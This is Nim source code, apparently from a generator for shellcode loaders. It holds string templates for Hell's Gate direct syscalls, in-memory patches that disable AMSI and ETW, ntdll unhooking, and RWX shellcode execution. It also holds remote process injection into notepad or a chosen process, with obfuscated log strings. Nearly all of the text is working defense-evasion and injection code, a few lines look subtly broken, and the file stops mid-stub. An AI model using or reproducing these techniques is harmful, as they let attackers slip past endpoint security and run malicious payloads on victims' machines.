            currModule = getNextModule(currFlink)
            if beginModule == currModule:
                break
            continue

        if not getExportTable(currModule, pExportTable):
            echo obf("[-] Failed to get export table...")
            return false

        if getTableEntry(currModule.DLLBase, pExportTable, tableEntry):
            return true
        
        currModule = getNextModule(currFlink)
        if beginModule == currModule:
            break
    return false

proc getSyscall*(tableEntry : var HG_TABLE_ENTRY) : bool =
    
    let currentPeb  : PPEB = GetPEBAsm64()
       
    if not searchLoadedModules(currentPeb, tableEntry):
        return false

    return true

"""

let GetSyscallStub = """
type
  PS_ATTR_UNION* {.pure, union.} = object
    Value*: ULONG
    ValuePtr*: PVOID
  PS_ATTRIBUTE* {.pure.} = object
    Attribute*: ULONG 
    Size*: SIZE_T
    u1*: PS_ATTR_UNION
    ReturnLength*: PSIZE_T
  PPS_ATTRIBUTE* = ptr PS_ATTRIBUTE
  PS_ATTRIBUTE_LIST* {.pure.} = object
    TotalLength*: SIZE_T
    Attributes*: array[2, PS_ATTRIBUTE]
  PPS_ATTRIBUTE_LIST* = ptr PS_ATTRIBUTE_LIST
  KNORMAL_ROUTINE* {.pure.} = object
    NormalContext*: PVOID
    SystemArgument1*: PVOID
    SystemArgument2*: PVOID
  PKNORMAL_ROUTINE* = ptr KNORMAL_ROUTINE

var 
    SYSCALL_STUB_SIZE: int = 23;

proc RVAtoRawOffset(RVA: DWORD_PTR, section: PIMAGE_SECTION_HEADER): PVOID =
    return cast[PVOID](RVA - section.VirtualAddress + section.PointerToRawData)

proc GetSyscallStub(functionName: LPCSTR, syscallStub: LPVOID): BOOL =
    var
        file: HANDLE
        fileSize: DWORD
        bytesRead: DWORD
        fileData: LPVOID
        ntdllString: LPCSTR = "C:\\windows\\system32\\ntdll.dll"
        nullHandle: HANDLE
    file = CreateFileA(ntdllString, cast[DWORD](GENERIC_READ), cast[DWORD](FILE_SHARE_READ), cast[LPSECURITY_ATTRIBUTES](NULL), cast[DWORD](OPEN_EXISTING), cast[DWORD](FILE_ATTRIBUTE_NORMAL), nullHandle)
    fileSize = GetFileSize(file, nil)
    fileData = HeapAlloc(GetProcessHeap(), 0, fileSize)
    ReadFile(file, fileData, fileSize, addr bytesRead, nil)

    var
        dosHeader: PIMAGE_DOS_HEADER = cast[PIMAGE_DOS_HEADER](fileData)
        imageNTHeaders: PIMAGE_NT_HEADERS = cast[PIMAGE_NT_HEADERS](cast[DWORD_PTR](fileData) + dosHeader.e_lfanew)
        exportDirRVA: DWORD = imageNTHeaders.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress
        section: PIMAGE_SECTION_HEADER = IMAGE_FIRST_SECTION(imageNTHeaders)
        textSection: PIMAGE_SECTION_HEADER = section
        rdataSection: PIMAGE_SECTION_HEADER = section

    let low: uint16 = 0

    for Section in low ..< imageNTHeaders.FileHeader.NumberOfSections:
        var ntdllSectionHeader = cast[PIMAGE_SECTION_HEADER](cast[DWORD_PTR](IMAGE_FIRST_SECTION(imageNTHeaders)) + cast[DWORD_PTR](IMAGE_SIZEOF_SECTION_HEADER * Section))
        if ".rdata" in toString(ntdllSectionHeader.Name):
            rdataSection = ntdllSectionHeader
        
    var exportDirectory: PIMAGE_EXPORT_DIRECTORY = cast[PIMAGE_EXPORT_DIRECTORY](RVAtoRawOffset(cast[DWORD_PTR](fileData) + exportDirRVA, rdataSection))

    var addressOfNames: PDWORD = cast[PDWORD](RVAtoRawOffset(cast[DWORD_PTR](fileData) + cast[DWORD_PTR](exportDirectory.AddressOfNames), rdataSection))
    var addressOfFunctions: PDWORD = cast[PDWORD](RVAtoRawOffset(cast[DWORD_PTR](fileData) + cast[DWORD_PTR](exportDirectory.AddressOfFunctions), rdataSection))
    var stubFound: BOOL = 0
    var oldProtection: DWORD = 0
    let low2: int = 0
    for low2 in 0 ..< exportDirectory.NumberOfNames:
        var functionNameVA: DWORD_PTR = cast[DWORD_PTR](RVAtoRawOffset(cast[DWORD_PTR](fileData) + addressOfNames[low2], rdataSection))
        var functionVA: DWORD_PTR = cast[DWORD_PTR](RVAtoRawOffset(cast[DWORD_PTR](fileData) + addressOfFunctions[low2 + 1], textSection))
        var functionNameResolved: LPCSTR = cast[LPCSTR](functionNameVA)
        var compare: int = lstrcmpA(functionNameResolved,functionName)
        if (compare == 0):
        if (functionNameResolved == functionName):
            #echo functionNameResolved
            copyMem(syscallStub, cast[LPVOID](functionVA), SYSCALL_STUB_SIZE)
            stubFound = 1
            #echo obf("Found Syscall STUB!")
    return stubFound

"""

let AMSIETWDelegates = """
# Unmanaged NTDLL Declarations
type myNtProtectVM = proc(ProcessHandle: HANDLE, BaseAddress: PVOID, RegionSize: PSIZE_T, NewProtect: ULONG, OldProtect: PULONG): NTSTATUS {.stdcall.}
type myNtWriteVM = proc (ProcessHandle: HANDLE, BaseAddress: PVOID, Buffer: PVOID, NumberOfBytesToWrite: SIZE_T, NumberOfBytesWritten: PSIZE_T): NTSTATUS {.stdcall.}

"""

let LocalInjectDelegates = """
# Unmanaged NTDLL Declarations
type myNtAllocateVirtualMemory = proc(ProcessHandle: HANDLE, BaseAddress: PVOID, ZeroBits: ULONG, RegionSize: PSIZE_T, AllocationType: ULONG, Protect: ULONG): NTSTATUS {.stdcall.}
type myNtWriteVirtualMemory = proc(ProcessHandle: HANDLE, BaseAddress: PVOID, Buffer: PVOID, NumberOfBytesToWrite: SIZE_T, NumberOfBytesWritten: PSIZE_T): NTSTATUS {.stdcall.}

"""

let RemoteInjectDelegates = """
# Unmanaged NTDLL Declarations
type myNtOpenProcess = proc(ProcessHandle: PHANDLE, DesiredAccess: ACCESS_MASK, ObjectAttributes: POBJECT_ATTRIBUTES, ClientId: PCLIENT_ID): NTSTATUS {.stdcall.}
type myNtAllocateVirtualMemory = proc(ProcessHandle: HANDLE, BaseAddress: PVOID, ZeroBits: ULONG, RegionSize: PSIZE_T, AllocationType: ULONG, Protect: ULONG): NTSTATUS {.stdcall.}
type myNtWriteVirtualMemory = proc(ProcessHandle: HANDLE, BaseAddress: PVOID, Buffer: PVOID, NumberOfBytesToWrite: SIZE_T, NumberOfBytesWritten: PSIZE_T): NTSTATUS {.stdcall.}
type myNtCreateThreadEx = proc(ThreadHandle: PHANDLE, DesiredAccess: ACCESS_MASK, ObjectAttributes: POBJECT_ATTRIBUTES, ProcessHandle: HANDLE, StartRoutine: PVOID, Argument: PVOID, CreateFlags: ULONG, ZeroBits: SIZE_T, StackSize: SIZE_T, MaximumStackSize: SIZE_T, AttributeList: PPS_ATTRIBUTE_LIST): NTSTATUS {.stdcall.}

"""

let HellsgateAllocDelegate = """

proc NtAllocateVirtualMemory(ProcessHandle: HANDLE, BaseAddress: PVOID, ZeroBits: ULONG, RegionSize: PSIZE_T, AllocationType: ULONG, Protect: ULONG): NTSTATUS {.asmNoStackFrame.} =
    asm ===
        mov r10, rcx
        mov eax, `syscall`
        syscall
        ret
    ===


"""

let HellsgateWriteDelegate = """


proc NtWriteVirtualMemory(ProcessHandle: HANDLE, BaseAddress: PVOID, Buffer: PVOID, NumberOfBytesToWrite: SIZE_T, NumberOfBytesWritten: PSIZE_T): NTSTATUS {.asmNoStackFrame.} =
    asm ===
        mov r10, rcx
        mov eax, `syscall`
        syscall
        ret
    ===

"""

let HellsgateProtectDelegate = """


proc NtProtectVirtualMemory(ProcessHandle: HANDLE, BaseAddress: PVOID, RegionSize: PSIZE_T, NewProtect: ULONG, OldProtect: PULONG): NTSTATUS {.asmNoStackFrame.} =
    asm ===
        mov r10, rcx
        mov eax, `syscall`
        syscall
        ret
    ===

"""

let HellsgateNtCreateThreadExDelegate = """

proc NtCreateThreadEx(ThreadHandle: PHANDLE, DesiredAccess: ACCESS_MASK, ObjectAttributes: POBJECT_ATTRIBUTES, ProcessHandle: HANDLE, StartRoutine: PVOID, Argument: PVOID, CreateFlags: ULONG, ZeroBits: SIZE_T, StackSize: SIZE_T, MaximumStackSize: SIZE_T, AttributeList: PPS_ATTRIBUTE_LIST): NTSTATUS {.asmNoStackFrame.} =
    asm ===
        mov r10, rcx
        mov eax, `syscall`
        syscall
        ret
    ===

"""

let HellsgateLocalInjectStub = """
                

proc pwndemHellsGateLike[byte](friendlycode: openarray[byte]): void =

    when defined(amd64):

        let tProcess = GetCurrentProcessId()
        var pHandle: HANDLE = getCurrentProcess()
        
        var 
            ntAllocfuncHash        : uint64            = djb2_hash("NtAllocateVirtualMemory")
            ntAllocTable         : HG_TABLE_ENTRY    = HG_TABLE_ENTRY(dwHash : ntAllocfuncHash)
            status          : NTSTATUS          = 0x00000000
            buffer          : LPVOID
            dataSz          : SIZE_T            = cast[SIZE_T](friendlycode.len)


        if getSyscall(ntAllocTable):
                
            syscall = ntAllocTable.wSysCall
            status = NtAllocateVirtualMemory(pHandle, &buffer, 0, &dataSz, MEM_COMMIT, PAGE_EXECUTE_READWRITE)
                
            if not NT_SUCCESS(status):
                echo obf("[-] Failed to allocate memory.")
            else:
                echo obf("[+] Allocated a page of memory with RWX perms")
        else:
            echo obf("[-] Failed to find opcode for NtAllocateVirtualMemory")

        var 
            ntWritefuncHash        : uint64            = djb2_hash("NtWriteVirtualMemory")
            ntWriteTable         : HG_TABLE_ENTRY    = HG_TABLE_ENTRY(dwHash : ntWritefuncHash)
            bytesWritten: SIZE_T

        if getSyscall(ntWriteTable):

            syscall = ntWriteTable.wSysCall
            status = NtWriteVirtualMemory(pHandle,buffer,unsafeAddr friendlycode,dataSz-1,addr bytesWritten)

            if not NT_SUCCESS(status):
                echo obf("[-] Failed to write memory.")
            else:
                echo obf("[+] NtWriteVirtualMemory - wrote bytes ") & fmt"{bytesWritten}"
                
               
        else:
            echo obf("[-] Failed to find opcode for NtWriteVirtualMemory")
            
        let f = cast[proc(){.nimcall.}](buffer)
        f()

when isMainModule:
     pwndemHellsGateLike(dectext)
"""


let HellsgateAMSIPatchStub = """

proc PatchAmsi(): bool =
    var
        amsi: LibHandle
        cs: pointer
        op: ULONG
        t: ULONG
        disabled: bool = false
    
    when defined amd64:
        let patch: array[6, byte] = [byte 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3]
    elif defined i386:
        let patch: array[8, byte] = [byte 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00]
    # loadLib does the same thing that the dynlib pragma does and is the equivalent of LoadLibrary() on windows
    # it also returns nil if something goes wrong meaning we can add some checks in the code to make sure everything's ok (which you can't really do well when using LoadLibrary() directly through winim)
    amsi = loadLib(obf("amsi"))
    if isNil(amsi):
        echo obf("[X] Failed to load amsi.dll")
        return disabled

    cs = amsi.symAddr(obf("AmsiScanBuffer")) # equivalent of GetProcAddress()
    if isNil(cs):
        echo obf("[X] Failed to get the address of 'AmsiScanBuffer'")
        return disabled
    
    var oldProtection: DWORD = 0

    var success: BOOL
    var protectAddress = cs
    var friendlycodeLength = cast[SIZE_T](patch.len)

    var pHandle: HANDLE = getCurrentProcess()
        
    var 
        ntProtectfuncHash        : uint64            = djb2_hash("NtProtectVirtualMemory")
        ntProtectTable         : HG_TABLE_ENTRY    = HG_TABLE_ENTRY(dwHash : ntProtectfuncHash)
        status          : NTSTATUS          = 0x00000000
        buffer          : LPVOID


    if getSyscall(ntProtectTable):
                
        syscall = ntProtectTable.wSysCall
        status = NtProtectVirtualMemory(pHandle, addr protectAddress,addr friendlycodeLength,0x40,addr t)
                
        if not NT_SUCCESS(status):
            echo obf("[-] Failed to allocate memory.")
        else:
            echo obf("[*] Applying Syscall AMSI patch")
    else:
        echo obf("[-] Failed to find opcode for NtProtectVirtualMemory")

    var 
        ntWritefuncHash        : uint64            = djb2_hash("NtWriteVirtualMemory")
        ntWriteTable         : HG_TABLE_ENTRY    = HG_TABLE_ENTRY(dwHash : ntWritefuncHash)
        bytesWritten: SIZE_T

    if getSyscall(ntWriteTable):

        syscall = ntWriteTable.wSysCall
        var outLength: SIZE_T
        status = NtWriteVirtualMemory(pHandle,cs,unsafeAddr patch,patch.len,addr outLength)

        if not NT_SUCCESS(status):
            echo obf("[-] Failed to write memory.")
        else:
            echo obf("[+] NtWriteVirtualMemory Succeed!")
                
               
    else:
        echo obf("[-] Failed to find opcode for NtWriteVirtualMemory")


    if getSyscall(ntProtectTable):
                
        syscall = ntProtectTable.wSysCall
        status = NtProtectVirtualMemory(pHandle,addr protectAddress,addr friendlycodeLength,cast[ULONG](t),addr op)
                
        if not NT_SUCCESS(status):
            echo obf("[-] Failed to allocate memory.")
        else:
            echo obf("[+] OldProtect set back")
            disabled = true
    else:
        echo obf("[-] Failed to find opcode for NtProtectVirtualMemory")
    
    return disabled

when isMainModule:
    success = PatchAmsi()
    echo obf("[*] AMSI disabled: ") & fmt"{bool(success)}"


"""

let HellsgateETWPatchStub = """

proc Patchntdll(): bool =
    var
        ntdll: LibHandle
        cs: pointer
        op: ULONG
        t: ULONG
        disabled: bool = false

    when defined amd64:
        let patch: array[1, byte] = [byte 0xc3]
    elif defined i386:
        let patch: array[4, byte] = [byte 0xc2, 0x14, 0x00, 0x00]
    # loadLib does the same thing that the dynlib pragma does and is the equivalent of LoadLibrary() on windows
    # it also returns nil if something goes wrong meaning we can add some checks in the code to make sure everything's ok (which you can't really do well when using LoadLibrary() directly through winim)
    ntdll = loadLib("obf(ntdll)")
    if isNil(ntdll):
        echo obf("[X] Failed to load ntdll.dll")
        return disabled

    cs = ntdll.symAddr(obf("EtwEventWrite")) # equivalent of GetProcAddress()
    if isNil(cs):
        echo obf("[X] Failed to get the address of 'EtwEventWrite'")
        return disabled

    var oldProtection: DWORD = 0

    var success: BOOL
    var protectAddress = cs
    var friendlycodeLength = cast[SIZE_T](patch.len)

    let tProcess = GetCurrentProcessId()
    var pHandle: HANDLE = getCurrentProcess()
        
    var 
        ntProtectfuncHash        : uint64            = djb2_hash("NtProtectVirtualMemory")
        ntProtectTable         : HG_TABLE_ENTRY    = HG_TABLE_ENTRY(dwHash : ntProtectfuncHash)
        status          : NTSTATUS          = 0x00000000
        buffer          : LPVOID


    if getSyscall(ntProtectTable):
                
        syscall = ntProtectTable.wSysCall
        status = NtProtectVirtualMemory(pHandle, addr protectAddress,addr friendlycodeLength,0x40,addr t)
                
        if not NT_SUCCESS(status):
            echo obf("[-] Failed to allocate memory.")
        else:
            echo obf("[*] Applying Syscall ETW patch")
    else:
        echo obf("[-] Failed to find opcode for NtProtectVirtualMemory")

    var 
        ntWritefuncHash        : uint64            = djb2_hash("NtWriteVirtualMemory")
        ntWriteTable         : HG_TABLE_ENTRY    = HG_TABLE_ENTRY(dwHash : ntWritefuncHash)
        bytesWritten: SIZE_T

    if getSyscall(ntWriteTable):

        syscall = ntWriteTable.wSysCall
        var outLength: SIZE_T
        status = NtWriteVirtualMemory(pHandle,cs,unsafeAddr patch,patch.len,addr outLength)

        if not NT_SUCCESS(status):
            echo obf("[-] Failed to write memory.")
        else:
            echo obf("[+] NtWriteVirtualMemory Succeed!")
                
               
    else:
        echo obf("[-] Failed to find opcode for NtWriteVirtualMemory")

    if getSyscall(ntProtectTable):
                
        syscall = ntProtectTable.wSysCall
        status = NtProtectVirtualMemory(pHandle,addr protectAddress,addr friendlycodeLength,cast[ULONG](t),addr op)
                
        if not NT_SUCCESS(status):
            echo obf("[-] Failed to allocate memory.")
        else:
            echo obf("[+] OldProtect set back")
            disabled = true
    else:
        echo obf("[-] Failed to find opcode for NtProtectVirtualMemory")
    
    return disabled

when isMainModule:
    success = Patchntdll()
    echo obf("[*] ETW blocked by patch: ") & fmt"{bool(success)}"

"""

let UnhookStub = """

from winim import MODULEINFO, GetModuleInformation

proc ntdllunhook(): bool =
  let low: uint16 = 0
  var 
      processH = GetCurrentProcess()
      mi : MODULEINFO
      ntdllModule = GetModuleHandleA(obf("ntdll.dll"))
      ntdllBase : LPVOID
      ntdllFile : FileHandle
      ntdllMapping : HANDLE
      ntdllMappingAddress : LPVOID
      hookedDosHeader : PIMAGE_DOS_HEADER
      hookedNtHeader : PIMAGE_NT_HEADERS
      hookedSectionHeader : PIMAGE_SECTION_HEADER

  GetModuleInformation(processH, ntdllModule, addr mi, cast[DWORD](sizeof(mi)))
  ntdllBase = mi.lpBaseOfDll
  ntdllFile = getOsFileHandle(open(obf("C:\\windows\\system32\\ntdll.dll"),fmRead))
  ntdllMapping = CreateFileMapping(ntdllFile, NULL, PAGE_READONLY or SEC_IMAGE, 0, 0, NULL) # 0x02 =  PAGE_READONLY & 0x1000000 = SEC_IMAGE
  if ntdllMapping == 0:
    echo obf("Could not create file mapping object ") &  fmt"({GetLastError()})."
    return false
  ntdllMappingAddress = MapViewOfFile(ntdllMapping, FILE_MAP_READ, 0, 0, 0)
  if ntdllMappingAddress.isNil:
    echo obf("Could not map view of file ") & fmt"({GetLastError()})."
    return false
  hookedDosHeader = cast[PIMAGE_DOS_HEADER](ntdllBase)
  hookedNtHeader = cast[PIMAGE_NT_HEADERS](cast[DWORD_PTR](ntdllBase) + hookedDosHeader.e_lfanew)
  for Section in low ..< hookedNtHeader.FileHeader.NumberOfSections:
      hookedSectionHeader = cast[PIMAGE_SECTION_HEADER](cast[DWORD_PTR](IMAGE_FIRST_SECTION(hookedNtHeader)) + cast[DWORD_PTR](IMAGE_SIZEOF_SECTION_HEADER * Section))
      if ".text" in toString(hookedSectionHeader.Name):
          var oldProtection : DWORD = 0
          if VirtualProtect(ntdllBase + hookedSectionHeader.VirtualAddress, hookedSectionHeader.Misc.VirtualSize, 0x40, addr oldProtection) == 0:#0x40 = PAGE_EXECUTE_READWRITE
            echo obf("Failed calling VirtualProtect ") & fmt"({GetLastError()})."
            return false
          copyMem(ntdllBase + hookedSectionHeader.VirtualAddress, ntdllMappingAddress + hookedSectionHeader.VirtualAddress, hookedSectionHeader.Misc.VirtualSize)
          if VirtualProtect(ntdllBase + hookedSectionHeader.VirtualAddress, hookedSectionHeader.Misc.VirtualSize, oldProtection, addr oldProtection) == 0:
            echo obf("Failed resetting memory back to it's orignal protections ") & fmt"({GetLastError()})."
            return false  
  CloseHandle(processH)
  CloseHandle(ntdllFile)
  CloseHandle(ntdllMapping)
  FreeLibrary(ntdllModule)
  return true


when isMainModule:
  var result = ntdllunhook()
  echo obf("[*] unhook Ntdll: ") & fmt"{bool(result)}")

"""


let AMSIStub = """
proc PatchAmsi(): bool =
    var
        amsi: LibHandle
        cs: pointer
        op: ULONG
        t: ULONG
        disabled: bool = false
    
    when defined amd64:
        let patch: array[6, byte] = [byte 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3]
    elif defined i386:
        let patch: array[8, byte] = [byte 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00]
    # loadLib does the same thing that the dynlib pragma does and is the equivalent of LoadLibrary() on windows
    # it also returns nil if something goes wrong meaning we can add some checks in the code to make sure everything's ok (which you can't really do well when using LoadLibrary() directly through winim)
    amsi = loadLib(obf("amsi"))
    if isNil(amsi):
        echo obf("[X] Failed to load amsi.dll")
        return disabled

    cs = amsi.symAddr(obf("AmsiScanBuffer")) # equivalent of GetProcAddress()
    if isNil(cs):
        echo obf("[X] Failed to get the address of 'AmsiScanBuffer'")
        return disabled
    
    var hProcess: HANDLE
    hProcess = GetCurrentProcess()

    let tProcess2 = GetCurrentProcessId()
    var pHandle2: HANDLE = OpenProcess(PROCESS_ALL_ACCESS, FALSE, tProcess2)
    var syscallStub_NtProtect: LPVOID
    syscallStub_NtProtect = VirtualAllocEx(
        pHandle2,
        NULL,
        cast[SIZE_T](SYSCALL_STUB_SIZE),
        MEM_COMMIT,
        PAGE_EXECUTE_READ_WRITE
    )

    var syscallStub_NtWrite: HANDLE = cast[HANDLE](syscallStub_NtProtect) + cast[HANDLE](SYSCALL_STUB_SIZE)

    var oldProtection: DWORD = 0

    # Define NtProtectVirtualMemory
    var NtProtectVirtualMemory: myNtProtectVM = cast[myNtProtectVM](cast[LPVOID](syscallStub_NtProtect))
    VirtualProtect(cast[LPVOID](syscallStub_NtProtect), SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, addr oldProtection)

    # define NtWriteVirtualMemory
    let NtWriteVirtualMemory = cast[myNtWriteVM](cast[LPVOID](syscallStub_NtWrite))
    VirtualProtect(cast[LPVOID](syscallStub_NtWrite), SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, addr oldProtection)

    var success: BOOL
    var protectAddress = cs
    success = GetSyscallStub("NtProtectVirtualMemory", cast[LPVOID](syscallStub_NtProtect))
    success = GetSyscallStub("NtWriteVirtualMemory", cast[LPVOID](syscallStub_NtWrite))
    var friendlycodeLength = cast[SIZE_T](patch.len)
    success = NtProtectVirtualMemory(hProcess,addr protectAddress,addr friendlycodeLength,0x40,addr t) 
    if (success != 0):
        echo obf("NtProtectVirtualMemory failed")
        return disabled
    echo obf("[*] Applying Syscall AMSI patch")
    var outLength: SIZE_T
    
    success = NtWriteVirtualMemory(hProcess,cs,unsafeAddr patch,patch.len,addr outLength)
    
    if (success != 0):
        echo obf("NtWriteVirtualMemory failed")
        return disabled
        # fails for some reason
        #copyMem(addr cs, unsafeAddr patch, patch.len)
    success =  NtProtectVirtualMemory(hProcess,addr protectAddress,addr friendlycodeLength,cast[ULONG](t),addr op)
    if (success != 0):
        echo obf("NtWriteVirtualMemory failed")
        return disabled
    else:
        echo obf("[*] OldProtect set back")
        disabled = true
    
    success = VirtualProtect(syscallStub_NtProtect, 4096, PAGE_READWRITE, addr op)
    # Fails for some reason
    #success = NtProtectVirtualMemory(hProcess,addr syscallStub_NtProtect,addr friendlycodeLength,PAGE_READWRITE,addr op)
    echo obf("[*] Restored Stub protections: ") & $success

    return disabled

when isMainModule:
    success = PatchAmsi()
    echo obf("[*] AMSI disabled: ") & fmt"{bool(success)}"
"""

let ETWCOMVARStub = """
proc BlockETW(): bool =
    # Disable ETW via https://blog.xpnsec.com/hiding-your-dotnet-complus-etwenabled/
    var cometw: string = obf("COMPlus_ETWEnabled")
    var setnull: string = "0"
    putenv(cometw, setnull)
    return true

when isMainModule:
    var success = BlockETW()
    echo obf("[*] ETW blocked by COMPLUS_ETWEnabled variable: ") & fmt"{bool(success)}"
"""

let ETWPatchStub = """

proc Patchntdll(): bool =
    var
        ntdll: LibHandle
        cs: pointer
        op: ULONG
        t: ULONG
        disabled: bool = false

    when defined amd64:
        let patch: array[1, byte] = [byte 0xc3]
    elif defined i386:
        let patch: array[4, byte] = [byte 0xc2, 0x14, 0x00, 0x00]
    # loadLib does the same thing that the dynlib pragma does and is the equivalent of LoadLibrary() on windows
    # it also returns nil if something goes wrong meaning we can add some checks in the code to make sure everything's ok (which you can't really do well when using LoadLibrary() directly through winim)
    ntdll = loadLib(obf("ntdll"))
    if isNil(ntdll):
        echo obf("[X] Failed to load ntdll.dll")
        return disabled

    cs = ntdll.symAddr(obf("EtwEventWrite")) # equivalent of GetProcAddress()
    if isNil(cs):
        echo obf("[X] Failed to get the address of 'EtwEventWrite'")
        return disabled

    var hProcess: HANDLE
    hProcess = GetCurrentProcess()

    let tProcess2 = GetCurrentProcessId()
    var pHandle2: HANDLE = OpenProcess(PROCESS_ALL_ACCESS, FALSE, tProcess2)
    var syscallStub_NtProtect: LPVOID
    syscallStub_NtProtect = VirtualAllocEx(
        pHandle2,
        NULL,
        cast[SIZE_T](SYSCALL_STUB_SIZE),
        MEM_COMMIT,
        PAGE_EXECUTE_READ_WRITE
    )

    var syscallStub_NtWrite: HANDLE = cast[HANDLE](syscallStub_NtProtect) + cast[HANDLE](SYSCALL_STUB_SIZE)

    var oldProtection: DWORD = 0

    # Define NtProtectVirtualMemory
    var NtProtectVirtualMemory: myNtProtectVM = cast[myNtProtectVM](cast[LPVOID](syscallStub_NtProtect))
    VirtualProtect(cast[LPVOID](syscallStub_NtProtect), SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, addr oldProtection)

    # define NtWriteVirtualMemory
    let NtWriteVirtualMemory = cast[myNtWriteVM](cast[LPVOID](syscallStub_NtWrite))
    VirtualProtect(cast[LPVOID](syscallStub_NtWrite), SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, addr oldProtection)

    var success: BOOL
    var protectAddress = cs
    success = GetSyscallStub("NtProtectVirtualMemory", cast[LPVOID](syscallStub_NtProtect))
    success = GetSyscallStub("NtWriteVirtualMemory", cast[LPVOID](syscallStub_NtWrite))
    var friendlycodeLength = cast[SIZE_T](patch.len)
    success = NtProtectVirtualMemory(hProcess,addr protectAddress,addr friendlycodeLength,0x40,addr t) 
    if (success != 0):
        echo obf("NtProtectVirtualMemory failed")
        return disabled
    echo obf("[*] Applying Syscall ETW patch")
    var outLength: SIZE_T
    
    success = NtWriteVirtualMemory(hProcess,cs,unsafeAddr patch,patch.len,addr outLength)
    
    if (success != 0):
        echo obf("NtWriteVirtualMemory failed")
        return disabled
        # fails for some reason
        #copyMem(addr cs, unsafeAddr patch, patch.len)
    success =  NtProtectVirtualMemory(hProcess,addr protectAddress,addr friendlycodeLength,t,addr op)
    if (success != 0):
        echo obf("NtWriteVirtualMemory failed")
        return disabled
    else:
        echo obf("[*] OldProtect set back")
        disabled = true
    
    success = VirtualProtect(syscallStub_NtProtect, 4096, PAGE_READWRITE, addr op)

    return disabled

when isMainModule:
    success = Patchntdll()
    echo obf("[*] ETW blocked by patch: ") & fmt"{bool(success)}"
"""

let ShellcodelocalStub = """
from winlean import getCurrentProcess

proc pwndem[byte](friendlycode: openarray[byte]): void =

    let tProcess = GetCurrentProcessId()
    var pHandle: HANDLE = getCurrentProcess()

    let syscallStub_NtAlloc = VirtualAllocEx(
        pHandle,
        NULL,
        cast[SIZE_T](SYSCALL_STUB_SIZE),
        MEM_COMMIT,
        PAGE_EXECUTE_READ_WRITE
    )

    
    var syscallStub_NtWrite: HANDLE = cast[HANDLE](syscallStub_NtAlloc) + cast[HANDLE](SYSCALL_STUB_SIZE)
    
    var oldProtection: DWORD = 0
    var cid: CLIENT_ID
    var oa: OBJECT_ATTRIBUTES
    var tHandle: HANDLE
    var sc_size: SIZE_T = cast[SIZE_T](friendlycode.len)
    var ds: LPVOID
    
    cid.UniqueProcess = tProcess

    # define NtAllocateVirtualMemory
    let NtAllocateVirtualMemory = cast[myNtAllocateVirtualMemory](cast[LPVOID](syscallStub_NtAlloc));
    VirtualProtect(cast[LPVOID](syscallStub_NtAlloc), SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, addr oldProtection);

    # define NtWriteVirtualMemory
    let NtWriteVirtualMemory = cast[myNtWriteVirtualMemory](cast[LPVOID](syscallStub_NtWrite));
    VirtualProtect(cast[LPVOID](syscallStub_NtWrite), SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, addr oldProtection);


    var status: NTSTATUS
    var success: BOOL

    success = GetSyscallStub("NtAllocateVirtualMemory", cast[LPVOID](syscallStub_NtAlloc));
    success = GetSyscallStub("NtWriteVirtualMemory", cast[LPVOID](syscallStub_NtWrite));
  
    cid.UniqueProcess = tProcess

    status = NtAllocateVirtualMemory(pHandle, &ds, 0, &sc_size,MEM_COMMIT,PAGE_EXECUTE_READWRITE);
    echo obf("[*] NtAllocateVirtualMemory: "), status
    var bytesWritten: SIZE_T

    status = NtWriteVirtualMemory(pHandle,ds,unsafeAddr friendlycode,sc_size-1,addr bytesWritten);

    echo obf("[*] NtWriteVirtualMemory: "), status
    echo obf("    \\-- bytes written: "), bytesWritten
    echo obf("")
    
    let f = cast[proc(){.nimcall.}](ds)
    f()

    status = NtClose(pHandle)


when isMainModule:
     pwndem(dectext)

"""

let ShellcoderemoteinjectStub_notepad = """
proc injectCreateRemoteThread(friendlycode: openarray[byte]): void =

    # Under the hood, the startProcess function from Nim's osproc module is calling CreateProcess() :D
    let tProcess = startProcess(obf("notepad.exe"))
    tProcess.suspend() # That's handy!
    defer: tProcess.close()

    echo obf("[*] Target Process: "), tProcess.processID

    var cid: CLIENT_ID
    var oa: OBJECT_ATTRIBUTES
    var pHandle: HANDLE
    var tHandle: HANDLE
    var ds: LPVOID
    var sc_size: SIZE_T = cast[SIZE_T](friendlycode.len)

    cid.UniqueProcess = tProcess.processID

"""

let ShellcoderemoteinjectStub_customproc = fmt"""

from winim import PROCESSENTRY32A,CreateToolhelp32Snapshot,TH32CS_SNAPPROCESS,PROCESSENTRY32,Process32FirstA,Process32NextA

proc FindPidByName * (processName : string):DWORD =
    try:
        var 
            entry : PROCESSENTRY32A
            snapshot : HANDLE
            pid : DWORD = 0
        snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)
        if snapshot != INVALID_HANDLE_VALUE:
            entry.dwSize = DWORD(sizeof(PROCESSENTRY32))
            if Process32FirstA(snapshot,addr entry):
                while Process32NextA(snapshot,addr entry):
                    pid = entry.th32ProcessID
                    if ($(entry.szExeFile).join()).contains(processName):
                        result = pid
    except: 
        echo obf("Process ID not found")

proc injectCreateRemoteThread(friendlycode: openarray[byte]): void =

    var processID: DWORD
    var remoteprocesses: seq[string] = {remoteprocesses}
    var found: bool = false
    for m in remoteprocesses:
        if found == true: continue
        echo obf("Checking: ") & $m
        processID = FindPidByName(m)
        if (processID):
            found = true

    echo obf("[*] Target Process: "), processID

    var cid: CLIENT_ID
    var oa: OBJECT_ATTRIBUTES
    var pHandle: HANDLE
    var tHandle: HANDLE
    var ds: LPVOID
    var sc_size: SIZE_T = cast[SIZE_T](friendlycode.len)

    cid.UniqueProcess = processID

"""

let ShellcoderemoteinjectStub = """
    
    let tProcess2 = GetCurrentProcessId()
    var pHandle2: HANDLE = OpenProcess(PROCESS_ALL_ACCESS, FALSE, tProcess2)

    let syscallStub_NtOpenP = VirtualAllocEx(
        pHandle2,
        NULL,
        cast[SIZE_T](SYSCALL_STUB_SIZE),
        MEM_COMMIT,
        PAGE_EXECUTE_READ_WRITE
    )

